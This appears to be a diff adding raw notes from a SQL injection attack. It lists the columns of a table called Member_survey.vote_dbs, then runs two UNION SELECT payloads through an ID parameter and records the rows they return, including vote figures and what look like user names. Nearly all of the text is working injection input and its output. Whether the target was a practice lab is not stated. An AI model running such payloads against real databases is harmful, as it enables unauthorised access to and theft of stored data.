@@ -1,0 +1,66 @@
+in Member_survey.vote_dbs, we have 
+Title: id_vote
+Title: vote
+Title: nb_vote
+Title: subject
+
+
+
+
+
+test:
+1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs
+
+
+ ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_
+
+ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: 4218.18994140625
+Url : 2
+
+ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: 5.4375
+Url : 3
+
+ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: 8.647069931030273
+Url : 4
+
+ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: 9.100000381469727
+Url : 5
+
+ID:  1 and 1=1 UNION SELECT id_vote, vote from Member_survey.vote_dbs 
+Title: 6.968999862670898
+Url : 6
+
+
+
+test:
+1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: wil
+Url : 4256
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: alex
+Url : 16
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: Thor
+Url : 17
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: Ben
+Url : 666
+
+ID: 1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs 
+Title: ol
+Url : 69
